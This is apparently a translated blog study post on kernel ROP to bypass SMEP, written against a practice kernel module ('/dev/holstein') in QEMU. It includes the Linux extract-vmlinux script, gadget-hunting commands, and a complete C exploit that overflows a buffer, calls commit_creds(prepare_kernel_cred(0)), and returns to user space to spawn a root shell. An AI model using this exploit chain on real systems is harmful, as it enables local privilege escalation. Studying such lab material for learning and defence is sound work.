---
title: "[KERNEL] KROP_(SMEP bypass)"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ In the user area, ROP was used to bypass the NX-BIT protection technique. ROP in the kernel area is also a technique used to bypass the protection technique called SMEP. In order to perform ROP, you need to find a gadget called a 'code piece'. this"
date: "2024-06-28"
translation_key: "tistory-cd4ac779c5dc"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※****

In the user area, ROP was used to bypass the NX-BIT protection technique. ROP in the kernel area is also a technique used to bypass the protection technique called SMEP.

In order to perform ROP, you need to find a gadget called a 'code piece'. For this purpose, I have been using a tool called ROPgadget. This tool requires a binary as an argument. However, the only way to handle the kernel area so far is to execute and access it using .cgio files. Therefore, we need to extract the kernel binary first.

```
#!/bin/sh
# SPDX-License-Identifier: GPL-2.0-only
# ----------------------------------------------------------------------
# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
#
# Inspired from extract-ikconfig
# (c) 2009,2010 Dick Streefland <dick@streefland.net>
#
# (c) 2011      Corentin Chary <corentin.chary@gmail.com>
#
# ----------------------------------------------------------------------

check_vmlinux()
{
	# Use readelf to check if it's a valid ELF
	# TODO: find a better to way to check that it's really vmlinux
	#       and not just an elf
	readelf -h $1 > /dev/null 2>&1 || return 1

	cat $1
	exit 0
}

try_decompress()
{
	# The obscure use of the "tr" filter is to work around older versions of
	# "grep" that report the byte offset of the line instead of the pattern.

	# Try to find the header ($1) and decompress from here
	for	pos in `tr "$1\n$2" "\n$2=" < "$img" | grep -abo "^$2"`
	do
		pos=${pos%%:*}
		tail -c+$pos "$img" | $3 > $tmp 2> /dev/null
		check_vmlinux $tmp
	done
}

# Check invocation:
me=${0##*/}
img=$1
if	[ $# -ne 1 -o ! -s "$img" ]
then
	echo "Usage: $me <kernel-image>" >&2
	exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." >&2
```

[https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)

 [linux/scripts/extract-vmlinux at master · torvalds/linux

Linux kernel source tree. Contribute to torvalds/linux development by creating an account on GitHub.

github.com](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)

The above code extracts the kernel binary with a script named extract-vmlinux.

```
./extract-vmlinux ./bzImage > vmlinux
```

It can be used in this way.

![](/assets/images/tistory/tistory-cd4ac779c5dc/001.png)

Since the kernel binary has many gadgets, you must search for the gadget you are looking for with grep.

In addition, you must also find the command called iretq.

```
objdump -S -M intel ./vmlinux | grep iretq
```

![](/assets/images/tistory/tistory-cd4ac779c5dc/002.png)

To summarize the gadgets I found, they are as follows.

```
#define prdi  0xffffffff8127bbdc
#define prsi  0xffffffff8101ccde
#define prdx  0xffffffff81146092
#define prcx  0xffffffff812ea083
#define mrdi  0xffffffff8160c96b
#define swapgs  0xffffffff8160bf7e
#define iretq  0xffffffff810202af
```

The entire exploit code is written as follows.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
#define prdi  0xffffffff8127bbdc
#define prsi  0xffffffff8101ccde
#define prdx  0xffffffff81146092
#define prcx  0xffffffff812ea083
#define mrdi  0xffffffff8160c96b
#define swapgs  0xffffffff8160bf7e
#define iretq  0xffffffff810202af

static void win() {
        char *argv[] = { "/bin/sh", NULL };
        char *evnp[] = { NULL };
        puts("[+] win!");
        execve("/bin/sh", argv, evnp);
}

static void save_state() {
        asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %2\n"
            "pushfq\n"
            "popq %3\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags
)
	  :
      : "memory");
}

int main() {
    save_state();
    int fd = open("/dev/holstein", 2);

    char buf[0x500];
    memset(buf, 'A', 0x408);
    
    //commit_cred(prepare_kernel_cred(NULL)) 구현하기
    unsigned long *payload = (unsigned long*)&buf[0x408];
    *payload++ = prdi;
    *payload++ = 0;
    *payload++ = prepare_kernel_cred;
    *payload++ = prcx;
    *payload++ = 0; //rep 명령어 때문에 추가한 부분 -> rcx를 0으로 두어 반복을 안하기 위함
    *payload++ = mrdi;
    *payload++ = commit_creds;
    *payload++ = swapgs;
    *payload++ = iretq;
    *payload++ = (unsigned long*)&win;
    *payload++ = user_cs;
    *payload++ = user_rflags;
    *payload++ = user_rsp;
    *payload++ = user_ss;
    
    write(fd,buf, (void*)payload - (void*)buf);

    close(fd);
    return 0;
}
```

As mentioned earlier, KROP is a technique to bypass the SMEP protection technique. Therefore, we will test it after activating the SMEP technique.

Modify the run.sh file as follows.

```
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr" \
    -no-reboot \
    -cpu qemu64, +smep \
    -gdb tcp::12345 \
    -smp 1 \
    -monitor /dev/null \
    -initrd debugfs.cpio \
    -net nic,model=virtio \
    -net user
```

![](/assets/images/tistory/tistory-cd4ac779c5dc/003.png)